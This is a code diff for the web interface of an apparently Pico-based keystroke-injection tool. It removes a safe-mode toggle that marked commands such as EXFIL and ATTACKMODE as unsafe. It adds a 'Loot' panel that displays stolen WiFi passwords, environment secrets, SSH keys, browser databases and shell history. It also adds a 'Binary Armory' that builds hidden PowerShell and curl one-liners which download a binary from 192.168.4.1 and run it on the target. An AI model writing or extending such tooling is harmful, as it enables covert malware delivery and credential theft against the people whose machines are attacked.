@@ -3,7 +3,6 @@ const payloadField = document.getElementById('payload');
 const saveButton = document.getElementById('save');
 const runButton = document.getElementById('run');
 const refreshButton = document.getElementById('refresh');
-const unsafeToggle = document.getElementById('unsafe-toggle');
 const keyboardOsSelect = document.getElementById('keyboard-os');
 const keyboardLayoutSelect = document.getElementById('keyboard-layout');
 const runHistory = document.getElementById('run-history');
@@ -19,23 +18,16 @@ const modalClose = document.getElementById('modal-close');
 const validationBadge = document.querySelector(
   '[data-bind="validation_badge"]',
 );
-const payloadLibrary = document.getElementById('payload-library');
-const saveAsInput = document.getElementById('save-as-name');
-const saveAsBtn = document.getElementById('save-as-btn');
-
 const uiState = {
   charWidth: 8,
   lineHeight: 22,
-  modeDescription: '',
   padLeft: 16,
   padTop: 14,
   changingTarget: false,
   keyboardOses: [],
   keyboardLayouts: [],
-  libraryWorking: false,
   running: false,
   saving: false,
-  togglingUnsafe: false,
   validating: false,
   validation: null,
   validationRequest: 0,
@@ -43,25 +35,6 @@ const uiState = {
   lastValidatedPayload: null,
 };
 
-const HL_UNSAFE = new Set([
-  'ATTACKMODE',
-  'EXFIL',
-  'HIDE_PAYLOAD',
-  'RESTORE_PAYLOAD',
-  'SAVE_ATTACKMODE',
-  'RESTORE_ATTACKMODE',
-  'SAVE_HOST_KEYBOARD_LOCK_STATE',
-  'RESTORE_HOST_KEYBOARD_LOCK_STATE',
-  'WAIT_FOR_CAPS_CHANGE',
-  'WAIT_FOR_CAPS_OFF',
-  'WAIT_FOR_CAPS_ON',
-  'WAIT_FOR_NUM_CHANGE',
-  'WAIT_FOR_NUM_OFF',
-  'WAIT_FOR_NUM_ON',
-  'WAIT_FOR_SCROLL_CHANGE',
-  'WAIT_FOR_SCROLL_OFF',
-  'WAIT_FOR_SCROLL_ON',
-]);
 const HL_FLOW = new Set([
   'IF',
   'ELSE',
@@ -88,6 +61,7 @@ const HL_STRING_CMD = new Set([
   'END_STRINGLN',
 ]);
 const HL_KEYWORD = new Set([
+  'ATTACKMODE',
   'DELAY',
   'DEFAULTDELAY',
   'DEFAULT_DELAY',
@@ -96,15 +70,31 @@ const HL_KEYWORD = new Set([
   'DEFAULTCHARJITTER',
   'DISABLE_BUTTON',
   'ENABLE_BUTTON',
+  'EXFIL',
+  'HIDE_PAYLOAD',
   'INJECT_MOD',
   'INJECT_VAR',
   'RD_KBD',
   'RELEASE',
   'RESET',
-  'STOP_PAYLOAD',
+  'RESTORE_ATTACKMODE',
+  'RESTORE_HOST_KEYBOARD_LOCK_STATE',
+  'RESTORE_PAYLOAD',
   'RESTART_PAYLOAD',
+  'SAVE_ATTACKMODE',
+  'SAVE_HOST_KEYBOARD_LOCK_STATE',
+  'STOP_PAYLOAD',
   'VERSION',
   'WAIT_FOR_BUTTON_PRESS',
+  'WAIT_FOR_CAPS_CHANGE',
+  'WAIT_FOR_CAPS_OFF',
+  'WAIT_FOR_CAPS_ON',
+  'WAIT_FOR_NUM_CHANGE',
+  'WAIT_FOR_NUM_OFF',
+  'WAIT_FOR_NUM_ON',
+  'WAIT_FOR_SCROLL_CHANGE',
+  'WAIT_FOR_SCROLL_OFF',
+  'WAIT_FOR_SCROLL_ON',
   'RANDOM_CHAR',
   'RANDOM_CHAR_FROM',
   'RANDOM_LOWERCASE_LETTER',
@@ -144,8 +134,7 @@ function highlightLine(raw) {
   const rest = spaceAt < 0 ? '' : stripped.slice(spaceAt);
   const tu = token.toUpperCase();
   let cls = null;
-  if (HL_UNSAFE.has(tu)) cls = 'hl-unsafe';
-  else if (HL_FLOW.has(tu)) cls = 'hl-flow';
+  if (HL_FLOW.has(tu)) cls = 'hl-flow';
   else if (HL_STRING_CMD.has(tu) || HL_KEYWORD.has(tu)) cls = 'hl-keyword';
   if (!cls) return escHtml(raw);
   const indentHtml = escHtml(raw.slice(0, indent));
@@ -228,15 +217,8 @@ function updateControls() {
       !validation ||
       !validation.can_run;
   }
-  if (unsafeToggle) {
-    unsafeToggle.disabled = uiState.togglingUnsafe;
-  }
-  if (keyboardOsSelect) {
-    keyboardOsSelect.disabled = uiState.changingTarget;
-  }
-  if (keyboardLayoutSelect) {
-    keyboardLayoutSelect.disabled = uiState.changingTarget;
-  }
+  if (keyboardOsSelect) keyboardOsSelect.disabled = uiState.changingTarget;
+  if (keyboardLayoutSelect) keyboardLayoutSelect.disabled = uiState.changingTarget;
 }
 
 function itemTitle(item) {
@@ -280,8 +262,7 @@ function renderRunHistory(entries = []) {
     badge.className = `history__badge ${isOk ? 'history__badge--ok' : 'history__badge--err'}`;
     badge.textContent = isOk ? 'OK' : 'Err';
 
-    item.title =
-      `${sourceLabel} run #${entry.sequence}\n${entry.mode_label || ''}\n${entry.message || ''}`.trim();
+    item.title = `${sourceLabel} run #${entry.sequence}\n${entry.message || ''}`.trim();
 
     item.appendChild(tag);
     item.appendChild(text);
@@ -315,14 +296,6 @@ async function requestJson(path, options = {}) {
     throw error;
   }
   return data;
-}
-
-function applyMode(state) {
-  uiState.modeDescription = state.mode_description || '';
-  setBoundText('mode_label', (state.mode_label || '').split(' ')[0]);
-  if (unsafeToggle) {
-    unsafeToggle.checked = !!state.allow_unsafe;
-  }
 }
 
 function renderKeyboardLayouts(state) {
@@ -638,10 +611,9 @@ async function loadBootstrap() {
   measureEditor();
   renderHighlight();
   renderEditorDecorations({ diagnostics: [] });
-  loadLibrary();
+  loadLoot();
   setBoundText('ap_ssid', state.ap_ssid);
   setBoundText('ap_password', state.ap_password || 'Open network');
-  applyMode(state);
   renderKeyboardLayouts(state);
   renderRunHistory(state.run_history || []);
   setBoundText('seeded', state.seeded ? 'Yes' : 'No');
@@ -659,6 +631,8 @@ async function loadBootstrap() {
     queueValidation();
   }
   setNotice(state.message || '', state.notice || 'quiet');
+  if (state.has_binary) setArmoryBinaryReady(_TMP_BINARY_NAME);
+  startLootPolling();
 }
 
 async function changeKeyboardTarget(payload) {
@@ -686,34 +660,6 @@ async function changeKeyboardTarget(payload) {
     setNotice(error.message, 'error');
   } finally {
     uiState.changingTarget = false;
-    updateControls();
-  }
-}
-
-async function toggleUnsafe(unsafeOn) {
-  uiState.togglingUnsafe = true;
-  updateControls();
-  try {
-    const result = await requestJson('/api/safe-mode', {
-      method: 'POST',
-      body: JSON.stringify({ enabled: !unsafeOn, payload: payloadField.value }),
-    });
-    applyMode(result);
-    if (result.validation) {
-      uiState.validating = false;
-      renderValidation(result.validation);
-    }
-    setNotice(result.message, result.notice || 'success');
-  } catch (error) {
-    if (unsafeToggle) {
-      unsafeToggle.checked = !unsafeOn;
-    }
-    if (error.data?.validation) {
-      renderValidation(error.data.validation);
-    }
-    setNotice(error.message, 'error');
-  } finally {
-    uiState.togglingUnsafe = false;
     updateControls();
   }
 }
@@ -817,12 +763,6 @@ if (runButton) {
   });
 }
 
-if (unsafeToggle) {
-  unsafeToggle.addEventListener('change', () => {
-    toggleUnsafe(unsafeToggle.checked);
-  });
-}
-
 if (keyboardOsSelect) {
   keyboardOsSelect.addEventListener('change', () => {
     changeKeyboardTarget({ os: keyboardOsSelect.value });
@@ -870,121 +810,6 @@ window.addEventListener('resize', () => {
   }
 });
 
-function updateLibraryControls() {
-  if (saveAsBtn) saveAsBtn.disabled = uiState.libraryWorking;
-  if (saveAsInput) saveAsInput.disabled = uiState.libraryWorking;
-}
-
-function renderLibrary(payloads = []) {
-  if (!payloadLibrary) return;
-  payloadLibrary.textContent = '';
-  if (!payloads.length) {
-    const p = document.createElement('p');
-    p.className = 'library__empty';
-    p.textContent = 'No saved payloads.';
-    payloadLibrary.appendChild(p);
-    return;
-  }
-  payloads.forEach(({ name }) => {
-    const item = document.createElement('article');
-    item.className = 'library__item';
-
-    const nameEl = document.createElement('span');
-    nameEl.className = 'library__name';
-    nameEl.textContent = name;
-    nameEl.title = `${name}.dd`;
-
-    const actions = document.createElement('div');
-    actions.className = 'library__actions';
-
-    const loadBtn = document.createElement('button');
-    loadBtn.className = 'btn btn--ghost btn--sm';
-    loadBtn.type = 'button';
-    loadBtn.textContent = 'Load';
-    loadBtn.addEventListener('click', () => loadNamedPayload(name));
-
-    const delBtn = document.createElement('button');
-    delBtn.className = 'btn btn--danger-ghost btn--sm';
-    delBtn.type = 'button';
-    delBtn.textContent = 'Delete';
-    delBtn.setAttribute('aria-label', `Delete ${name}`);
-    delBtn.addEventListener('click', () => deleteNamedPayload(name));
-
-    actions.appendChild(loadBtn);
-    actions.appendChild(delBtn);
-    item.appendChild(nameEl);
-    item.appendChild(actions);
-    payloadLibrary.appendChild(item);
-  });
-}
-
-async function loadLibrary() {
-  try {
-    const result = await requestJson('/api/payloads');
-    renderLibrary(result.payloads || []);
-  } catch (_) {}
-}
-
-async function loadNamedPayload(name) {
-  if (uiState.libraryWorking) return;
-  uiState.libraryWorking = true;
-  try {
-    const result = await requestJson(
-      `/api/payloads/${encodeURIComponent(name)}`,
-    );
-    if (payloadField) {
-      payloadField.value = result.payload || '';
-      handlePayloadInput();
-    }
-    setNotice(`Loaded ${name}.dd`, 'success');
-  } catch (error) {
-    setNotice(error.message, 'error');
-  } finally {
-    uiState.libraryWorking = false;
-  }
-}
-
-async function deleteNamedPayload(name) {
-  if (uiState.libraryWorking) return;
-  uiState.libraryWorking = true;
-  try {
-    await requestJson(`/api/payloads/${encodeURIComponent(name)}`, {
-      method: 'DELETE',
-    });
-    setNotice(`Deleted ${name}.dd`, 'success');
-    loadLibrary();
-  } catch (error) {
-    setNotice(error.message, 'error');
-  } finally {
-    uiState.libraryWorking = false;
-  }
-}
-
-async function saveAsPayload() {
-  if (uiState.libraryWorking || !saveAsInput) return;
-  const name = saveAsInput.value.trim();
-  if (!name) {
-    setNotice('Enter a name first.', 'error');
-    return;
-  }
-  uiState.libraryWorking = true;
-  updateLibraryControls();
-  try {
-    await requestJson('/api/payloads', {
-      method: 'POST',
-      body: JSON.stringify({ name, payload: payloadField?.value || '' }),
-    });
-    saveAsInput.value = '';
-    setNotice(`Saved as ${name}.dd`, 'success');
-    loadLibrary();
-  } catch (error) {
-    setNotice(error.message, 'error');
-  } finally {
-    uiState.libraryWorking = false;
-    updateLibraryControls();
-  }
-}
-
 const apPasswordToggle = document.getElementById('ap-password-toggle');
 const apPasswordValue = document.getElementById('ap-password-value');
 
@@ -1001,14 +826,390 @@ if (apPasswordToggle && apPasswordValue) {
   });
 }
 
-if (saveAsBtn) {
-  saveAsBtn.addEventListener('click', saveAsPayload);
+loadBootstrap().catch((error) => setNotice(error.message, 'error'));
+
+// ─── Loot ─────────────────────────────────────────────────────────────────
+
+async function loadLoot() {
+  try {
+    const r = await fetch('/api/loot');
+    if (r.status === 404) {
+      renderLootEmpty();
+      return;
+    }
+    if (!r.ok) return;
+    const data = await r.json();
+    renderLoot(data);
+  } catch (_) {}
 }
 
-if (saveAsInput) {
-  saveAsInput.addEventListener('keydown', (e) => {
-    if (e.key === 'Enter') saveAsPayload();
+function renderLootEmpty() {
+  const el = document.getElementById('loot-body');
+  if (el) {
+    el.textContent = '';
+    const p = document.createElement('p');
+    p.className = 'history__empty';
+    p.textContent = 'No loot collected yet.';
+    el.appendChild(p);
+  }
+  const actions = document.getElementById('loot-actions');
+  if (actions) actions.hidden = true;
+}
+
+function renderLoot(data) {
+  const el = document.getElementById('loot-body');
+  if (!el) return;
+
+  const type = data.type || 'recon';
+  const s = data.system || {};
+  const u = data.user || {};
+  const osLabel = [s.os_name, s.os_version].filter(Boolean).join(' ');
+
+  let html = '';
+
+  // ── System + user header (shown for recon and any payload that has it) ──
+  if (s.hostname || u.username) {
+    const rows = [
+      s.hostname ? ['Host', escHtml(s.hostname)] : null,
+      osLabel ? ['OS', escHtml(osLabel)] : null,
+      s.arch ? ['Arch', escHtml(s.arch)] : null,
+      u.username
+        ? [
+            'User',
+            escHtml(u.username) +
+              (u.is_elevated
+                ? ' <span class="badge badge--warn" style="margin-left:4px">admin</span>'
+                : ''),
+          ]
+        : null,
+      data.processes?.length
+        ? ['Processes', String(data.processes.length)]
+        : null,
+      data.interfaces?.length
+        ? ['Interfaces', String(data.interfaces.length)]
+        : null,
+      data.software?.length ? ['Software', String(data.software.length)] : null,
+    ].filter(Boolean);
+    html +=
+      '<dl class="meta">' +
+      rows
+        .map(
+          ([label, value]) =>
+            `<div class="meta__row"><span class="meta__label">${label}</span>` +
+            `<span class="meta__value">${value}</span></div>`,
+        )
+        .join('') +
+      '</dl>';
+  }
+
+  // ── WiFi profiles (with passwords if present) ──
+  const wifi = data.wifi || [];
+  if (wifi.length) {
+    html += '<p class="meta__section-label">WiFi Profiles</p><dl class="meta">';
+    wifi.forEach((w) => {
+      html +=
+        `<div class="meta__row"><span class="meta__label">${escHtml(w.ssid || '?')}</span>` +
+        `<span class="meta__value meta__value--mono">${escHtml(w.password || '–')}</span></div>`;
+    });
+    html += '</dl>';
+  }
+
+  // ── Exfil-type fields ──
+  const secrets = data.env_secrets || [];
+  if (secrets.length) {
+    html += `<p class="meta__section-label">Env Secrets (${secrets.length})</p><dl class="meta">`;
+    secrets.slice(0, 8).forEach((kv) => {
+      html +=
+        `<div class="meta__row"><span class="meta__label">${escHtml(kv.key || '')}</span>` +
+        `<span class="meta__value meta__value--mono">${escHtml(String(kv.value || ''))}</span></div>`;
+    });
+    if (secrets.length > 8)
+      html += `<div class="meta__row"><span class="meta__label" style="opacity:.5">+${secrets.length - 8} more</span></div>`;
+    html += '</dl>';
+  }
+
+  const sshKeys = data.ssh_keys || [];
+  if (sshKeys.length) {
+    html += `<p class="meta__section-label">SSH Keys (${sshKeys.length})</p><dl class="meta">`;
+    sshKeys.forEach((k) => {
+      html +=
+        `<div class="meta__row"><span class="meta__label">${escHtml(k.file || '')}</span>` +
+        `<span class="meta__value">${k.content ? 'Present' : 'Empty'}</span></div>`;
+    });
+    html += '</dl>';
+  }
+
+  const browserPaths = data.browser_paths || [];
+  if (browserPaths.length) {
+    html += `<p class="meta__section-label">Browser DBs (${browserPaths.length})</p><dl class="meta">`;
+    browserPaths.forEach((p) => {
+      const short = String(p).split(/[/\\]/).slice(-2).join('/');
+      html += `<div class="meta__row"><span class="meta__label" style="font-size:.75rem">${escHtml(short)}</span></div>`;
+    });
+    html += '</dl>';
+  }
+
+  if (data.shell_history?.length) {
+    html += `<p class="meta__section-label">Shell History (${data.shell_history.length} lines)</p>`;
+  }
+
+  if (!html) {
+    html =
+      '<p class="history__empty">Loot received — no recognisable fields.</p>';
+  }
+
+  el.innerHTML = html;
+
+  const actions = document.getElementById('loot-actions');
+  if (actions) {
+    actions.hidden = false;
+    const btn = document.getElementById('loot-download');
+    if (btn) {
+      btn.onclick = () => {
+        window.location.href = '/api/loot/download';
+      };
+    }
+  }
+}
+
+// ─── Loot polling ─────────────────────────────────────────────────────────
+
+let _lootPollTimer = null;
+let _lastLootTimestamp = 0;
+
+function startLootPolling() {
+  if (_lootPollTimer) return;
+  _lootPollTimer = setInterval(async () => {
+    try {
+      const r = await fetch('/api/loot');
+      if (!r.ok) return;
+      const data = await r.json();
+      if (data.timestamp && data.timestamp !== _lastLootTimestamp) {
+        _lastLootTimestamp = data.timestamp;
+        renderLoot(data);
+      }
+    } catch (_) {}
+  }, 3000);
+}
+
+// ─── Accordion ────────────────────────────────────────────────────────────
+
+const _TMP_BINARY_NAME = 'payload.bin';
+
+function toggleAccordion(id) {
+  const duckySection = document.getElementById('accordion-ducky');
+  const armorySection = document.getElementById('accordion-armory');
+  const duckyBtn = document.getElementById('accordion-ducky-btn');
+  const armoryBtn = document.getElementById('accordion-armory-btn');
+  if (!duckySection || !armorySection) return;
+
+  const openDucky = id === 'ducky';
+  duckySection.classList.toggle('accordion__section--open', openDucky);
+  armorySection.classList.toggle('accordion__section--open', !openDucky);
+  duckyBtn?.setAttribute('aria-expanded', String(openDucky));
+  armoryBtn?.setAttribute('aria-expanded', String(!openDucky));
+
+  if (openDucky) {
+    measureEditor();
+    renderHighlight();
+  }
+}
+
+document
+  .getElementById('accordion-ducky-btn')
+  ?.addEventListener('click', () => {
+    if (
+      !document
+        .getElementById('accordion-ducky')
+        ?.classList.contains('accordion__section--open')
+    ) {
+      toggleAccordion('ducky');
+    }
+  });
+
+document
+  .getElementById('accordion-armory-btn')
+  ?.addEventListener('click', () => {
+    if (
+      !document
+        .getElementById('accordion-armory')
+        ?.classList.contains('accordion__section--open')
+    ) {
+      toggleAccordion('armory');
+    }
+  });
+
+// ─── Binary Armory ────────────────────────────────────────────────────────
+
+let _selectedFile = null;
+
+const _uploadZone = document.getElementById('upload-zone');
+const _binaryFileInput = document.getElementById('binary-file-input');
+
+function _formatBytes(bytes) {
+  if (bytes < 1024) return `${bytes} B`;
+  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
+  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
+}
+
+function _setSelectedFile(file) {
+  _selectedFile = file;
+  const prompt = document.getElementById('upload-zone-prompt');
+  const display = document.getElementById('upload-file-display');
+  const nameEl = document.getElementById('upload-filename');
+  const sizeEl = document.getElementById('upload-filesize');
+  if (prompt) prompt.hidden = true;
+  if (display) display.hidden = false;
+  if (nameEl) nameEl.textContent = file.name;
+  if (sizeEl) sizeEl.textContent = _formatBytes(file.size);
+  const uploadBtn = document.getElementById('upload-binary-btn');
+  if (uploadBtn) uploadBtn.disabled = false;
+  document.getElementById('inject-binary-btn')?.setAttribute('disabled', '');
+  _updateArmorySnippet();
+}
+
+if (_uploadZone) {
+  _uploadZone.addEventListener('click', (e) => {
+    if (e.target !== _binaryFileInput) _binaryFileInput?.click();
+  });
+  _uploadZone.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' || e.key === ' ') {
+      e.preventDefault();
+      _binaryFileInput?.click();
+    }
+  });
+  _uploadZone.addEventListener('dragover', (e) => {
+    e.preventDefault();
+    _uploadZone.classList.add('upload-zone--dragover');
+  });
+  _uploadZone.addEventListener('dragleave', () => {
+    _uploadZone.classList.remove('upload-zone--dragover');
+  });
+  _uploadZone.addEventListener('drop', (e) => {
+    e.preventDefault();
+    _uploadZone.classList.remove('upload-zone--dragover');
+    const file = e.dataTransfer?.files[0];
+    if (file) _setSelectedFile(file);
   });
 }
 
-loadBootstrap().catch((error) => setNotice(error.message, 'error'));
+_binaryFileInput?.addEventListener('change', () => {
+  const file = _binaryFileInput.files?.[0];
+  if (file) _setSelectedFile(file);
+});
+
+document
+  .getElementById('inject-os')
+  ?.addEventListener('change', _updateArmorySnippet);
+
+function _updateArmorySnippet() {
+  const os = document.getElementById('inject-os')?.value || 'windows';
+  const url = 'http://192.168.4.1/static/payload.bin';
+  let cmd = '';
+  if (os === 'windows') {
+    cmd = `powershell -w hidden -c "iwr ${url} -OutFile $env:TEMP\\pico_agent.exe; & $env:TEMP\\pico_agent.exe"`;
+  } else if (os === 'macos') {
+    cmd = `curl -s ${url} -o /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent &`;
+  } else {
+    cmd = `curl -s ${url} -o /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent &`;
+  }
+  const snippetEl = document.getElementById('armory-snippet');
+  const codeEl = document.getElementById('armory-snippet-code');
+  if (codeEl) codeEl.textContent = cmd;
+  if (snippetEl) snippetEl.hidden = false;
+}
+
+function setArmoryBinaryReady(name) {
+  const badge = document.getElementById('armory-badge');
+  if (badge) {
+    badge.textContent = name;
+    badge.hidden = false;
+  }
+  const btn = document.getElementById('inject-binary-btn');
+  if (btn) btn.disabled = false;
+}
+
+function _setArmoryNotice(message, type) {
+  const el = document.getElementById('armory-notice');
+  if (!el) return;
+  el.textContent = message;
+  el.className = `armory__notice notice notice--${type === 'quiet' ? 'quiet' : type}`;
+  if (!message) el.className = 'armory__notice notice notice--hidden';
+}
+
+document
+  .getElementById('upload-binary-btn')
+  ?.addEventListener('click', async () => {
+    if (!_selectedFile) return;
+    const progressEl = document.getElementById('upload-progress');
+    const progressBar = document.getElementById('upload-progress-bar');
+    const uploadBtn = document.getElementById('upload-binary-btn');
+    if (progressEl) progressEl.hidden = false;
+    if (progressBar) progressBar.style.width = '0%';
+    _setArmoryNotice('Uploading…', 'quiet');
+    if (uploadBtn) uploadBtn.disabled = true;
+
+    await new Promise((resolve) => {
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', '/api/upload_binary', true);
+      xhr.setRequestHeader('Content-Type', 'application/octet-stream');
+      xhr.setRequestHeader('X-Filename', _selectedFile.name);
+
+      xhr.upload.addEventListener('progress', (e) => {
+        if (e.lengthComputable && progressBar) {
+          progressBar.style.width = `${Math.round((e.loaded / e.total) * 100)}%`;
+        }
+      });
+
+      xhr.addEventListener('load', () => {
+        if (progressEl) progressEl.hidden = true;
+        let data = {};
+        try {
+          data = JSON.parse(xhr.responseText);
+        } catch (_) {}
+        if (xhr.status === 200) {
+          _setArmoryNotice(data.message || 'Upload complete.', 'success');
+          setArmoryBinaryReady(_selectedFile.name);
+        } else {
+          _setArmoryNotice(data.message || 'Upload failed.', 'error');
+          if (uploadBtn) uploadBtn.disabled = false;
+        }
+        resolve();
+      });
+
+      xhr.addEventListener('error', () => {
+        if (progressEl) progressEl.hidden = true;
+        _setArmoryNotice('Upload failed — connection error.', 'error');
+        if (uploadBtn) uploadBtn.disabled = false;
+        resolve();
+      });
+
+      xhr.send(_selectedFile);
+    });
+  });
+
+document
+  .getElementById('inject-binary-btn')
+  ?.addEventListener('click', async () => {
+    const os = document.getElementById('inject-os')?.value || 'windows';
+    const btn = document.getElementById('inject-binary-btn');
+    if (btn) btn.disabled = true;
+    _setArmoryNotice('Injecting stager…', 'quiet');
+    try {
+      const result = await requestJson('/api/inject_binary', {
+        method: 'POST',
+        body: JSON.stringify({ os }),
+      });
+      _setArmoryNotice(
+        result.message || 'Injected.',
+        result.notice || 'success',
+      );
+      setBoundText('hid_state', 'Ready');
+      if (result.run_history) renderRunHistory(result.run_history);
+    } catch (err) {
+      _setArmoryNotice(err.message || 'Injection failed.', 'error');
+      if (err.data?.run_history) renderRunHistory(err.data.run_history);
+    } finally {
+      if (btn) btn.disabled = false;
+    }
+  });
